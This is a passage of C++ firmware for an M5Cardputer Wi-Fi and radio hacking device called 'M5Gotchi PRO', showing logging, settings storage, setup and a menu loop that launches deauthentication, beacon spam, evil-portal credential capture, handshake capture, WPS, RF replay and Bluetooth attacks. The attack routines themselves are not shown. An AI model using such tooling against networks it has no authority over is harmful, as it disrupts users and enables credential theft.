    uint16_t ramColor = TFT_GREEN;
    if (ramPercent > 70) ramColor = TFT_YELLOW;
    if (ramPercent > 85) ramColor = TFT_RED;
    M5.Display.fillRect(barX, barY, ramBar, 10, ramColor);
    
    // Flash usage bar graph
    M5.Display.setCursor(4, 77);
    M5.Display.setTextColor(themeColors.primary, themeColors.bg);
    M5.Display.print("Flash: ");
    int flashPercent = (usedFlash * 100) / flashSize;
    M5.Display.printf("%d KB / %d MB (%d%%)", usedFlash / 1024, flashSize / 1048576, flashPercent);
    
    // Horizontal bar graph for Flash
    barY = 89;
    M5.Display.drawRect(barX - 1, barY - 1, barWidth + 2, 12, TFT_WHITE);
    int flashBar = (flashPercent * barWidth) / 100;
    uint16_t flashColor = TFT_GREEN;
    if (flashPercent > 70) flashColor = TFT_YELLOW;
    if (flashPercent > 85) flashColor = TFT_RED;
    M5.Display.fillRect(barX, barY, flashBar, 10, flashColor);
    
    // CPU usage animation (simulated based on loop time)
    static int cpuHistory[20] = {0};
    static int cpuIndex = 0;
    static unsigned long lastCpuUpdate = 0;
    
    if (millis() - lastCpuUpdate > 100) {
        // Simulate CPU usage (0-100%)
        int cpuUsage = random(20, 60); // Placeholder, real measurement would need FreeRTOS stats
        cpuHistory[cpuIndex] = cpuUsage;
        cpuIndex = (cpuIndex + 1) % 20;
        lastCpuUpdate = millis();
    }
    
    M5.Display.setCursor(4, 104);
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.print("CPU Activity:");
    
    // Mini CPU graph
    for (int i = 0; i < 20; i++) {
        int idx = (cpuIndex + i) % 20;
        int h = map(cpuHistory[idx], 0, 100, 0, 12);
        if (h > 0) {
            uint16_t cpuColor = TFT_GREEN;
            if (cpuHistory[idx] > 60) cpuColor = TFT_YELLOW;
            if (cpuHistory[idx] > 80) cpuColor = TFT_ORANGE;
            M5.Display.drawFastVLine(150 + i * 4, 115 - h, h, cpuColor);
        }
    }
    
    // SD Card info
    M5.Display.setCursor(4, 118);
    M5.Display.setTextColor(sdCardAvailable ? TFT_GREEN : TFT_RED, TFT_BLACK);
    M5.Display.printf("SD Card: %s", sdCardAvailable ? "OK" : "Not Found");
    
    if (sdCardAvailable) {
        uint64_t cardSize = SD.cardSize() / (1024 * 1024);
        uint64_t usedSize = SD.usedBytes() / (1024 * 1024);
        M5.Display.printf(" (%llu/%llu MB)", usedSize, cardSize);
    }
    
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.setCursor(4, SCREEN_HEIGHT - 12);
    M5.Display.println("[ESC] Back");
    drawStatusBar();
    delay(3000);
    currentMode = MODE_MENU;
    drawMenu();
}

// ==================== PERSISTENCE SYSTEM ====================
void writeLog(const char* message) {
    // Use new logging system
    addLog(LOG_INFO, message);
    
    // Also save to SD (legacy compatibility)
    if (!sdCardAvailable) return;
    
    File file = SD.open(logFile, FILE_APPEND);
    if (file) {
        unsigned long timestamp = millis() / 1000;
        file.printf("[%lu] %s\n", timestamp, message);
        file.close();
    }
}

void applyTheme(Theme theme) {
    currentTheme = theme;
    
    switch(theme) {
        case THEME_DARK:
            themeColors = {TFT_BLACK, TFT_WHITE, TFT_CYAN, TFT_YELLOW, TFT_GREEN, TFT_ORANGE, TFT_RED, TFT_DARKGREEN};
            break;
        case THEME_NEON:
            themeColors = {0x0010, TFT_MAGENTA, TFT_CYAN, TFT_PINK, TFT_GREEN, TFT_YELLOW, TFT_RED, TFT_PURPLE};
            break;
        case THEME_KAWAII:
            themeColors = {TFT_PINK, TFT_WHITE, 0xFBE0, 0xFFE0, TFT_GREEN, TFT_ORANGE, TFT_RED, TFT_PINK};
            break;
        case THEME_MATRIX:
            themeColors = {TFT_BLACK, TFT_GREEN, TFT_DARKGREEN, TFT_GREENYELLOW, TFT_GREEN, TFT_YELLOW, TFT_RED, TFT_DARKGREEN};
            break;
        case THEME_TERMINAL:
            themeColors = {TFT_BLACK, TFT_GREEN, TFT_GREEN, TFT_YELLOW, TFT_GREEN, TFT_YELLOW, TFT_RED, TFT_DARKGREEN};
            break;
    }
    
    writeLog("Theme changed");
}

// ==================== ADVANCED LOGGING SYSTEM ====================
void addLog(LogLevel level, const char* message) {
    addLog(level, String(message));
}

void addLog(LogLevel level, String message) {
    // Shift logs if buffer is full
    if (logCount >= MAX_LOG_ENTRIES) {
        for (int i = 0; i < MAX_LOG_ENTRIES - 1; i++) {
            logBuffer[i] = logBuffer[i + 1];
        }
        logCount = MAX_LOG_ENTRIES - 1;
    }
    
    // Add new log entry
    logBuffer[logCount].timestamp = millis();
    logBuffer[logCount].level = level;
    logBuffer[logCount].message = message;
    logCount++;
    
    // Also print to Serial with color codes
    const char* levelStr[] = {"[INFO]", "[WARN]", "[ERROR]", "[OK]"};
    Serial.printf("%s %s\n", levelStr[level], message.c_str());
    
    // Auto-save to SD if enabled
    if (autoSaveLogsEnabled && sdCardAvailable && (logCount % 10 == 0)) {
        saveLogsToSD();
    }
}

void saveLogsToSD() {
    if (!sdCardAvailable) return;
    
    File file = SD.open("/logs/system.log", FILE_APPEND);
    if (!file) {
        // Try to create logs directory
        SD.mkdir("/logs");
        file = SD.open("/logs/system.log", FILE_APPEND);
        if (!file) return;
    }
    
    // Save recent logs
    for (int i = max(0, logCount - 10); i < logCount; i++) {
        unsigned long sec = logBuffer[i].timestamp / 1000;
        const char* levelStr[] = {"INFO", "WARN", "ERROR", "OK"};
        
        file.printf("[%02lu:%02lu:%02lu] [%s] %s\n",
                    (sec / 3600) % 24, (sec / 60) % 60, sec % 60,
                    levelStr[logBuffer[i].level],
                    logBuffer[i].message.c_str());
    }
    
    file.close();
}

void clearLogs() {
    logCount = 0;
    logViewScroll = 0;
    addLog(LOG_INFO, "Logs cleared");
}

void showLogViewer() {
    currentMode = MODE_LOG_VIEWER;
    
    M5.Display.clear(themeColors.bg);
    drawHeader("System Logs");
    
    if (logCount == 0) {
        M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
        M5.Display.setCursor(4, 50);
        M5.Display.print("No logs yet");
    } else {
        // Display logs with scrolling
        int startIdx = max(0, logCount - 10 - logViewScroll);
        int endIdx = min(logCount, startIdx + 10);
        
        int y = 20;
        for (int i = endIdx - 1; i >= startIdx; i--) {  // Reverse order (newest first)
            // Time
            unsigned long sec = logBuffer[i].timestamp / 1000;
            M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
            M5.Display.setCursor(4, y);
            M5.Display.printf("%02lu:%02lu", (sec / 60) % 60, sec % 60);
            
            // Level badge
            uint16_t levelColor;
            const char* levelText;
            switch (logBuffer[i].level) {
                case LOG_INFO:
                    levelColor = themeColors.primary;
                    levelText = "I";
                    break;
                case LOG_WARNING:
                    levelColor = themeColors.warning;
                    levelText = "W";
                    break;
                case LOG_ERROR:
                    levelColor = themeColors.error;
                    levelText = "E";
                    break;
                case LOG_SUCCESS:
                    levelColor = themeColors.success;
                    levelText = "√";
                    break;
            }
            
            M5.Display.setTextColor(levelColor, themeColors.bg);
            M5.Display.setCursor(36, y);
            M5.Display.print(levelText);
            
            // Message (truncated to fit)
            M5.Display.setTextColor(themeColors.fg, themeColors.bg);
            M5.Display.setCursor(48, y);
            String msg = logBuffer[i].message;
            if (msg.length() > 28) {
                msg = msg.substring(0, 25) + "...";
            }
            M5.Display.print(msg);
            
            y += 10;
        }
        
        // Scroll indicator
        if (logCount > 10) {
            M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
            M5.Display.setCursor(210, 20);
            M5.Display.printf("%d/%d", min(10, logCount - logViewScroll), logCount);
        }
    }
    
    // Footer
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.setCursor(4, SCREEN_HEIGHT - 10);
    M5.Display.print("[ESC]Back [C]Clear [S]Save");
    
    drawStatusBar();
}

void showHelpScreen() {
    M5.Display.clear(themeColors.bg);
    drawHeader("Quick Help Guide");
    
    M5.Display.setTextColor(themeColors.primary, themeColors.bg);
    M5.Display.setCursor(4, 20);
    M5.Display.print("=== Navigation ===");
    
    M5.Display.setTextColor(themeColors.fg, themeColors.bg);
    M5.Display.setCursor(4, 32);
    M5.Display.print("1-9,A-H: Quick Menu");
    M5.Display.setCursor(4, 41);
    M5.Display.print("; / .: Arrow Up/Down");
    M5.Display.setCursor(4, 50);
    M5.Display.print("ENTER: Select Item");
    M5.Display.setCursor(4, 59);
    M5.Display.print("ESC: Back/Stop");
    
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.setCursor(4, 72);
    M5.Display.print("=== Features ===");
    
    M5.Display.setTextColor(themeColors.fg, themeColors.bg);
    M5.Display.setCursor(4, 84);
    M5.Display.print("T: Change Theme");
    M5.Display.setCursor(4, 93);
    M5.Display.print("B: Statistics");
    M5.Display.setCursor(4, 102);
    M5.Display.print("H: Bluetooth Attacks");
    M5.Display.setCursor(4, 111);
    M5.Display.print("G: RFID/NFC Tools");
    
    M5.Display.setTextColor(themeColors.error, themeColors.bg);
    M5.Display.setCursor(4, 120);
    M5.Display.print("WARNING: Ethical use only!");
    
    M5.Display.setTextColor(themeColors.secondary, themeColors.bg);
    M5.Display.setCursor(4, SCREEN_HEIGHT - 10);
    M5.Display.print("[ESC] Back");
    
    // Wait for ESC
    while (true) {
        M5.update();
        M5Cardputer.update();
        
        if (M5Cardputer.Keyboard.isChange()) {
            if (M5Cardputer.Keyboard.isPressed()) {
                Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
                for (auto key : status.word) {
                    if (key == 0x1B) { // ESC
                        currentMode = MODE_MENU;
                        drawMenu();
                        return;
                    }
                }
            }
        }
        delay(10);
    }
}

void saveConfig() {
    if (!sdCardAvailable) return;
    
    File file = SD.open(configFile, FILE_WRITE);
    if (!file) {
        Serial.println("❌ Failed to save config");
        return;
    }
    
    // Create JSON manually (lightweight)
    file.println("{");
    file.printf("  \"theme\": %d,\n", currentTheme);
    file.printf("  \"autoSave\": %s,\n", autoSaveEnabled ? "true" : "false");
    file.printf("  \"customSSID\": \"%s\",\n", customSSID.c_str());
    file.printf("  \"version\": \"1.0\"\n");
    file.println("}");
    file.close();
    
    Serial.println("💾 Config saved");
}

void loadConfig() {
    if (!sdCardAvailable || !SD.exists(configFile)) {
        Serial.println("⚠️ No config file, using defaults");
        return;
    }
    
    Serial.println("📂 Opening config file...");
    File file = SD.open(configFile, FILE_READ);
    if (!file) {
        Serial.println("❌ Failed to open config file");
        return;
    }
    
    unsigned long startTime = millis();
    const unsigned long TIMEOUT = 2000; // 2 second timeout
    
    // Simple parsing (read line by line)
    while (file.available() && (millis() - startTime < TIMEOUT)) {
        String line = file.readStringUntil('\n');
        line.trim();
        
        if (line.indexOf("\"theme\":") >= 0) {
            int themeVal = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
            applyTheme((Theme)themeVal);
        }
        else if (line.indexOf("\"autoSave\":") >= 0) {
            autoSaveEnabled = line.indexOf("true") >= 0;
        }
        else if (line.indexOf("\"customSSID\":") >= 0) {
            int start = line.indexOf('"', line.indexOf(':')) + 1;
            int end = line.lastIndexOf('"');
            if (start > 0 && end > start) {
                customSSID = line.substring(start, end);
            }
        }
    }
    file.close();
    
    Serial.println("✅ Config loaded");
}

void saveStats() {
    if (!sdCardAvailable) return;
    
    File file = SD.open(statsFile, FILE_WRITE);
    if (!file) return;
    
    file.println("{");
    file.printf("  \"sessionStart\": %lu,\n", sessionStartTime);
    file.printf("  \"totalScans\": %lu,\n", totalScans);
    file.printf("  \"networksFound\": %lu,\n", totalNetworksFound);
    file.printf("  \"deauthSent\": %lu,\n", totalDeauthSent);
    file.printf("  \"beaconsSent\": %lu,\n", totalBeaconsSent);
    file.printf("  \"probesSent\": %lu,\n", totalProbesSent);
    file.printf("  \"handshakes\": %lu,\n", totalHandshakesCaptured);
    file.printf("  \"credentials\": %lu,\n", totalCredentialsCaptured);
    file.printf("  \"apsLogged\": %lu\n", totalAPsLogged);
    file.println("}");
    file.close();
    
    Serial.println("📊 Stats saved");
}

void loadStats() {
    if (!sdCardAvailable || !SD.exists(statsFile)) {
        Serial.println("⚠️ No stats file");
        return;
    }
    
    Serial.println("📊 Loading stats...");
    File file = SD.open(statsFile, FILE_READ);
    if (!file) {
        Serial.println("❌ Failed to open stats file");
        return;
    }
    
    unsigned long startTime = millis();
    const unsigned long TIMEOUT = 2000; // 2 second timeout
    
    while (file.available() && (millis() - startTime < TIMEOUT)) {
        String line = file.readStringUntil('\n');
        line.trim();
        
        if (line.indexOf("\"totalScans\":") >= 0) {
            totalScans = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
        }
        else if (line.indexOf("\"networksFound\":") >= 0) {
            totalNetworksFound = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
        }
        else if (line.indexOf("\"deauthSent\":") >= 0) {
            totalDeauthSent = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
        }
        else if (line.indexOf("\"beaconsSent\":") >= 0) {
            totalBeaconsSent = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
        }
        else if (line.indexOf("\"handshakes\":") >= 0) {
            totalHandshakesCaptured = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
        }
        else if (line.indexOf("\"credentials\":") >= 0) {
            totalCredentialsCaptured = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
        }
    }
    file.close();
    
    Serial.println("✅ Stats loaded");
}

void saveSession() {
    if (!sdCardAvailable) return;
    
    File file = SD.open(sessionFile, FILE_WRITE);
    if (!file) return;
    
    file.println("{");
    file.printf("  \"mode\": %d,\n", currentMode);
    file.printf("  \"selectedNetwork\": %d,\n", selectedNetwork);
    file.printf("  \"networkCount\": %d,\n", networkCount);
    file.printf("  \"timestamp\": %lu\n", millis());
    file.println("}");
    file.close();
    
    Serial.println("💾 Session saved");
}

void loadSession() {
    if (!sdCardAvailable || !SD.exists(sessionFile)) {
        Serial.println("⚠️ No session file");
        return;
    }
    
    Serial.println("📂 Loading session...");
    File file = SD.open(sessionFile, FILE_READ);
    if (!file) {
        Serial.println("❌ Failed to open session file");
        return;
    }
    
    unsigned long startTime = millis();
    const unsigned long TIMEOUT = 1000; // 1 second timeout
    
    while (file.available() && (millis() - startTime < TIMEOUT)) {
        String line = file.readStringUntil('\n');
        line.trim();
        
        if (line.indexOf("\"mode\":") >= 0) {
            int mode = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
            // Don't restore mode automatically, just load data
        }
        else if (line.indexOf("\"selectedNetwork\":") >= 0) {
            selectedNetwork = line.substring(line.indexOf(':') + 1, line.indexOf(',')).toInt();
        }
    }
    file.close();
    
    Serial.println("✅ Session loaded");
}

void autoSaveAll() {
    if (!autoSaveEnabled || !sdCardAvailable) return;
    
    if (millis() - lastAutoSave >= AUTO_SAVE_INTERVAL) {
        saveConfig();
        saveStats();
        saveSession();
        lastAutoSave = millis();
        
        Serial.println("💾 Auto-save completed");
    }
}

// ==================== SETUP ====================
void setup() {
    Serial.begin(115200);
    delay(200);
    Serial.println("\n\n========================================");
    Serial.println("🐱 M5Gotchi PRO - Starting...");
    Serial.println("========================================");
    
    Serial.println("[1/12] M5.begin()...");
    auto cfg = M5.config();
    M5.begin(cfg);
    Serial.println("        ✓ OK");
    
    Serial.println("[2/12] M5Cardputer.begin()...");
    M5Cardputer.begin();
    Serial.println("        ✓ OK");
    
    Serial.println("[3/12] Display setup...");
    M5.Display.setRotation(1);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(themeColors.fg, themeColors.bg);
    Serial.println("        ✓ OK");
    
    // Splash screen
    Serial.println("[4/12] Drawing splash...");
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setTextColor(TFT_CYAN);
    M5.Display.setTextSize(2);
    M5.Display.setCursor(40, 50);
    M5.Display.print("M5GOTCHI");
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(TFT_YELLOW);
    M5.Display.setCursor(80, 75);
    M5.Display.print("PRO v1.0");
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(50, 100);
    M5.Display.print("Loading...");
    Serial.println("        ✓ OK");
    
    Serial.println("[5/12] Initializing SD Card...");
    M5.Display.setCursor(50, 110);
    M5.Display.print("SD Card...");
    initSDCard();
    if (sdCardAvailable) {
        Serial.println("        ✓ SD Card OK");
    } else {
        Serial.println("        ⚠ SD Card not available");
    }
    
    Serial.println("[6/12] Loading config...");
    M5.Display.setCursor(50, 115);
    M5.Display.print("Config...");
    if (sdCardAvailable) {
        loadConfig();
        loadStats();
        loadSession();
        Serial.println("        ✓ Config loaded");
    } else {
        Serial.println("        ⚠ Using defaults");
    }
    
    Serial.println("[7/12] Initializing WiFi...");
    M5.Display.setCursor(50, 120);
    M5.Display.print("WiFi...");
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    Serial.println("        ✓ WiFi OK");
    
    Serial.println("[8/12] Initializing stats...");
    sessionStartTime = millis();
    if (totalScans == 0) {
        totalScans = 0;
        totalNetworksFound = 0;
    }
    Serial.println("        ✓ Stats OK");
    
    Serial.println("[9/12] Initializing Tutorial System...");
    tutorialSystem = new TutorialSystem();
    tutorialSystem->init();
    Serial.println("        ✓ Tutorial System OK");
    
    Serial.println("[10/12] Initializing Achievement Manager...");
    achievementManager = new AchievementManager();
    achievementManager->init();
    Serial.println("        ✓ Achievement Manager OK");
    
    Serial.println("[11/12] Writing boot log...");
    writeLog("System boot");
    Serial.println("        ✓ Log OK");
    
    Serial.println("[12/12] Drawing menu...");
    M5.Display.setCursor(50, 125);
    M5.Display.setTextColor(TFT_GREEN);
    M5.Display.print("Dashboard pronto");
    delay(300);

    stage5::init();
    stage5::enter("Kiisu", 88, 90, 4, 80);
    stage5::logEvent("Sistema iniciado", 0x5FFF);
    stage5::forceRender();
    currentMode = MODE_DASHBOARD;
    Serial.println("        ✓ Dashboard OK");
    
    Serial.println("\n========================================");
    Serial.println("✅ M5Gotchi PRO Ready!");
    Serial.println("📂 Config: " + String(sdCardAvailable ? "SD Card" : "Defaults"));
    Serial.println("⚠️  WARNING: Use only on your own networks!");
    Serial.println("========================================\n");
}

// ==================== LOOP ====================
void loop() {
    M5.update();
    M5Cardputer.update();
    
    // Auto-save system
    autoSaveAll();
    
    if (currentMode == MODE_DASHBOARD) {
        stage5::Input input;
        bool hasInput = false;

        if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
            Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
            for (auto key : status.word) {
                if (key == 0) {
                    continue;
                }
                switch (key) {
                    case ';':
                    case 'w':
                    case 'W':
                        input.missionUp = true;
                        hasInput = true;
                        break;
                    case '.':
                    case 's':
                    case 'S':
                        input.missionDown = true;
                        hasInput = true;
                        break;
                    case ',':
                    case 'a':
                    case 'A':
                        input.macroLeft = true;
                        hasInput = true;
                        break;
                    case '/':
                    case 'd':
                    case 'D':
                        input.macroRight = true;
                        hasInput = true;
                        break;
                    case ' ':
                        input.toggleMacro = true;
                        hasInput = true;
                        break;
                    case 'f':
                    case 'F':
                        input.feedPet = true;
                        hasInput = true;
                        break;
                    case 'p':
                    case 'P':
                        input.petPet = true;
                        hasInput = true;
                        break;
                    case 'n':
                    case 'N':
                        input.nextPage = true;
                        hasInput = true;
                        break;
                    case 'b':
                    case 'B':
                        input.prevPage = true;
                        hasInput = true;
                        break;
                    case 0x0D:
                        input.enter = true;
                        hasInput = true;
                        break;
                    default:
                        break;
                }
            }
        }

        if (hasInput) {
            stage5::handleInput(input);
        }

        stage5::tick(millis());
        return;
    }

    // Update active attacks
    if (currentMode == MODE_DEAUTH) {
        updateDeauth();
    } else if (currentMode == MODE_BEACON_SPAM) {
        updateBeaconSpam();
    } else if (currentMode == MODE_PROBE_FLOOD) {
        updateProbeFlood();
    } else if (currentMode == MODE_EVIL_PORTAL) {
        updateEvilPortal();
    } else if (currentMode == MODE_HANDSHAKE) {
        updateHandshakeCapture();
    } else if (currentMode == MODE_CHANNEL_ANALYZER) {
        updateChannelAnalyzer();
    } else if (currentMode == MODE_PACKET_MONITOR) {
        updatePacketMonitor();
    } else if (currentMode == MODE_FILE_MANAGER) {
        updateFileManager();
    } else if (currentMode == MODE_GPS_WARDRIVING) {
        updateGPSWardriving();
    } else if (currentMode == MODE_WPS_ATTACK) {
        updateWPSAttack();
    } else if (currentMode == MODE_IR_REMOTE) {
        updateIRRemote();
    } else if (currentMode == MODE_RF433) {
        updateRF433();
    } else if (currentMode == MODE_LORA_SCANNER) {
        updateLoRaScanner();
    } else if (currentMode == MODE_RFID_NFC) {
        updateRFIDNFC();
    } else if (currentMode == MODE_BLUETOOTH) {
        updateBluetooth();
    } else if (currentMode == MODE_NEKO_PET) {
        updateNekoPet();
    } else if (currentMode == MODE_TUTORIAL) {
        updateTutorial();
    } else if (currentMode == MODE_ACHIEVEMENTS) {
        updateAchievements();
    }
    
    if (M5Cardputer.Keyboard.isChange()) {
        if (M5Cardputer.Keyboard.isPressed()) {
            Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
            
            for (auto key : status.word) {
                // Global ESC handler
                if (key == 0x1B) { // ESC
                    if (currentMode == MODE_DEAUTH) {
                        stopDeauth();
                    } else if (currentMode == MODE_BEACON_SPAM) {
                        stopBeaconSpam();
                    } else if (currentMode == MODE_PROBE_FLOOD) {
                        stopProbeFlood();
                    } else if (currentMode == MODE_EVIL_PORTAL) {
                        stopEvilPortal();
                    } else if (currentMode == MODE_HANDSHAKE) {
                        stopHandshakeCapture();
                    } else if (currentMode == MODE_CHANNEL_ANALYZER) {
                        stopChannelAnalyzer();
                    } else if (currentMode == MODE_PACKET_MONITOR) {
                        stopPacketMonitor();
                    } else if (currentMode == MODE_FILE_MANAGER) {
                        stopFileManager();
                    } else if (currentMode == MODE_GPS_WARDRIVING) {
                        stopGPSWardriving();
                        currentMode = MODE_MENU;
                        drawMenu();
                    } else if (currentMode == MODE_WPS_ATTACK) {
                        stopWPSAttack();
                        currentMode = MODE_MENU;
                        drawMenu();
                    } else if (currentMode == MODE_IR_REMOTE) {
                        stopIRRemote();
                        currentMode = MODE_MENU;
                        drawMenu();
                    } else if (currentMode == MODE_RF433) {
                        stopRF433();
                        currentMode = MODE_MENU;
                        drawMenu();
                    } else if (currentMode == MODE_LORA_SCANNER) {
                        stopLoRaScanner();
                        currentMode = MODE_MENU;
                        drawMenu();
                    } else if (currentMode == MODE_RFID_NFC) {
                        stopRFIDNFC();
                    } else if (currentMode == MODE_BLUETOOTH) {
                        stopBluetooth();
                    } else if (currentMode == MODE_NEKO_PET) {
                        stopNekoPet();
                    } else if (currentMode == MODE_TUTORIAL) {
                        stopTutorial();
                    } else if (currentMode == MODE_ACHIEVEMENTS) {
                        stopAchievements();
                    } else if (currentMode == MODE_LOG_VIEWER) {
                        currentMode = MODE_MENU;
                        drawMenu();
                    } else if (currentMode == MODE_STATISTICS) {
                        currentMode = MODE_MENU;
                        drawMenu();
                    } else {
                        currentMode = MODE_MENU;
                        drawMenu();
                    }
                    continue;
                }
                
                // Manual deauth em handshake mode / delete em file manager
                if (key == 'd' || key == 'D') {
                    if (currentMode == MODE_HANDSHAKE && isCapturingHandshake) {
                        sendDeauthPacket(networks[selectedNetwork].bssid, 
                                       networks[selectedNetwork].channel);
                        Serial.println("💥 Manual deauth sent!");
                    } else if (currentMode == MODE_WIFI_SCAN) {
                        startDeauth();
                    } else if (currentMode == MODE_FILE_MANAGER && fileList.size() > 0) {
                        String selected = fileList[selectedFile];
                        if (selected != "[SD Card Error]" && selected != "[Invalid Directory]" && 
                            selected != "[Empty Directory]" && selected != "../") {
                            String fullPath = currentDir;
                            if (!currentDir.endsWith("/")) fullPath += "/";
                            fullPath += selected;
                            deleteFile(fullPath);
                        }
                    }
                    continue;
                }
                
                // SPACE pause/resume handler
                if (key == ' ') {
                    if (currentMode == MODE_DEAUTH) {
                        isDeauthing = !isDeauthing;
                        drawDeauthScreen();
                    } else if (currentMode == MODE_BEACON_SPAM) {
                        isBeaconSpamming = !isBeaconSpamming;
                        drawBeaconSpamScreen();
                    } else if (currentMode == MODE_PROBE_FLOOD) {
                        isProbeFlooding = !isProbeFlooding;
                        drawProbeFloodScreen();
                    } else if (currentMode == MODE_CHANNEL_ANALYZER) {
                        drawChannelAnalyzer(); // Rescan
                    } else if (currentMode == MODE_GPS_WARDRIVING) {
                        isWardriving = !isWardriving;
                        drawGPSWardriving();
                    } else if (currentMode == MODE_WPS_ATTACK) {
                        if (networkCount > 0 && !wpsTargetSSID.isEmpty()) {
                            isWPSAttacking = !isWPSAttacking;
                            drawWPSAttack();
                        }
                    } else if (currentMode == MODE_IR_REMOTE) {
                        if (irCodeCount > 0) {
                            // Enviar código IR selecionado
                            IRCode &code = irCodes[selectedIRCode];
                            if (code.protocol == "NEC") {
                                irSender->sendNEC(code.code, code.bits);
                            } else if (code.protocol == "SONY") {
                                irSender->sendSony(code.code, code.bits);
                            } else {
                                irSender->sendRaw((uint16_t*)&code.code, code.bits, 38);
                            }
                            Serial.printf("🔴 Sent IR: %s\n", code.name.c_str());
                        }
                    } else if (currentMode == MODE_RF433) {
                        if (rfCodeCount > 0 && selectedRFCode < rfCodeCount) {
                            RFCode &code = rfCodes[selectedRFCode];
                            rfTransmitter->setProtocol(1);
                            rfTransmitter->setPulseLength(code.pulseLength);
                            rfTransmitter->send(code.code, code.bitLength);
                            Serial.printf("📡 Sent RF: %s\n", code.name.c_str());
                        }
                    } else if (currentMode == MODE_LORA_SCANNER) {
                        isScanningLoRa = !isScanningLoRa;
                        drawLoRaScanner();
                    }
                    continue;
                }
                
                // 'L' para Learning mode (IR)
                if ((key == 'l' || key == 'L') && currentMode == MODE_IR_REMOTE) {
                    isLearningIR = true;
                    drawIRRemote();
                    Serial.println("👂 IR Learning mode - point remote and press button");
                    continue;
                }
                
                // 'C' para Capture mode (RF) ou Clear logs (Log Viewer)
                if (key == 'c' || key == 'C') {
                    if (currentMode == MODE_RF433) {
                        isCapturingRF = !isCapturingRF;
                        drawRF433();
                        Serial.printf("📡 RF Capture: %s\n", isCapturingRF ? "ON" : "OFF");
                    } else if (currentMode == MODE_LOG_VIEWER) {
                        clearLogs();
                        showLogViewer();
                    }
                    continue;
                }
                
                // 'M' para mudar mode (IR)
                if ((key == 'm' || key == 'M') && currentMode == MODE_IR_REMOTE) {
                    if (irMode == "TV") irMode = "AC";
                    else if (irMode == "AC") irMode = "DVD";
                    else if (irMode == "DVD") irMode = "FAN";
                    else irMode = "TV";
                    drawIRRemote();
                    continue;
                }
                
                // 'S' para scan manual (GPS), save (RF), ou save logs
                if (key == 's' || key == 'S') {
                    if (currentMode == MODE_GPS_WARDRIVING) {
                        updateGPSWardriving();
                    } else if (currentMode == MODE_RF433 && sdCardAvailable) {
                        File file = SD.open("/rf_codes.txt", FILE_WRITE);
                        if (file) {
                            for (int i = 0; i < rfCodeCount; i++) {
                                file.printf("%s,%lu,%d,%d\n", 
                                    rfCodes[i].name.c_str(), rfCodes[i].code,
                                    rfCodes[i].bitLength, rfCodes[i].pulseLength);
                            }
                            file.close();
                            Serial.println("💾 RF codes saved to SD");
                        }
                    } else if (currentMode == MODE_LOG_VIEWER) {
                        saveLogsToSD();
                        addLog(LOG_SUCCESS, "Logs saved to SD");
                        showLogViewer();
                    }
                    continue;
                }
                
                // Menu navigation
                if (currentMode == MODE_MENU) {
                    if (key == '1') {
                        scanWiFi();
                    }
                    else if (key == '2') {
                        startDeauth();
                    }
                    else if (key == '3') {
                        startBeaconSpam();
                    }
                    else if (key == '4') {
                        startProbeFlood();
                    }
                    else if (key == '5') {
                        startEvilPortal();
                    }
                    else if (key == '6') {
                        startHandshakeCapture();
                    }
                    else if (key == '7') {
                        startChannelAnalyzer();
                    }
                    else if (key == '8') {
                        startPacketMonitor();
                    }
                    else if (key == '9') {
                        startFileManager();
                    }
                    else if (key == 'a' || key == 'A') {
                        startGPSWardriving();
                    }
                    else if (key == 'b' || key == 'B') {
                        startStatistics();
                    }
                    else if (key == 'c' || key == 'C') {
                        startWPSAttack();
                    }
                    else if (key == 'd' || key == 'D') {
                        startIRRemote();
                    }
                    else if (key == 'e' || key == 'E') {
                        startRF433();
                    }
                    else if (key == 'f' || key == 'F') {
                        startLoRaScanner();
                    }
                    else if (key == 'g' || key == 'G') {
                        startRFIDNFC();
                    }
                    else if (key == 'h' || key == 'H') {
                        startBluetooth();
                    }
                    else if (key == 'l' || key == 'L') {
                        showLogViewer();
                    }
                    else if (key == 'n' || key == 'N') {
                        startNekoPet();
                    }
                    else if (key == 'p' || key == 'P') {
                        startTutorial();
                    }
                    else if (key == 'q' || key == 'Q') {
                        startAchievements();
                    }
                    else if (key == '0') {
                        showSystemInfo();
                    }
                    else if (key == 't' || key == 'T') {
                        showThemeSelector();
                    }
                    else if (key == '?' || key == '/') {
                        showHelpScreen();
                    }
                    else if (key == ';') { // Arrow up
                        menuSelection = (menuSelection - 1 + 22) % 22;
                        drawMenu();
                    }
                    else if (key == '.') { // Arrow down
                        menuSelection = (menuSelection + 1) % 22;
                        drawMenu();
                    }
                    else if (key == 0x0D) { // Enter
                        if (menuSelection == 0) scanWiFi();
                        else if (menuSelection == 1) startDeauth();
                        else if (menuSelection == 2) startBeaconSpam();
                        else if (menuSelection == 3) startProbeFlood();
                        else if (menuSelection == 4) startEvilPortal();
                        else if (menuSelection == 5) startHandshakeCapture();
                        else if (menuSelection == 6) startChannelAnalyzer();
                        else if (menuSelection == 7) startPacketMonitor();
                        else if (menuSelection == 8) startFileManager();
                        else if (menuSelection == 9) startGPSWardriving();
                        else if (menuSelection == 10) startStatistics();
                        else if (menuSelection == 11) startWPSAttack();
                        else if (menuSelection == 12) startIRRemote();
